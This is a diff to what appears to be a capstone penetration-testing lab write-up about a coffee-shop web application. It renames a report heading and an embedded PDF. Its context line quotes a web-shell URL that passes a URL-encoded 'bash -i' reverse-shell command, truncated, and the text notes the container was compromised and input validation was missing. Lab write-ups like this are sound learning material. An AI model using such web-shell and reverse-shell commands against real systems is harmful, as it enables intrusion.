@@ -203,6 +203,6 @@ http://localhost/capstone/assets/21.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%
 
 And GG, we have successfully compromsied this container. It's crucial to avoid security vulnerabilites like XSS attacks. The URL & comment section appeared to lack any [input validation](https://www.sciencedirect.com/topics/computer-science/input-validation#:~:text=Input%20validation%20is%20the%20process,standard%20defined%20within%20the%20application.) and should valid the type of input being entered to ensure safe 
 
-# Vulnerability Assessment Report (Not Finished)
+# Vulnerability Assessment Report
 
-<iframe src="/assets/images/Coffe Shop/Coffee Co - Web Application Vulnerability Assessment.pdf#toolbar=0" width="100%" height="600px"></iframe>
+<iframe src="/assets/images/Coffe Shop/Coffee Corp - Web Application Vulnerability Assessment .pdf#toolbar=0" width="100%" height="600px"></iframe>
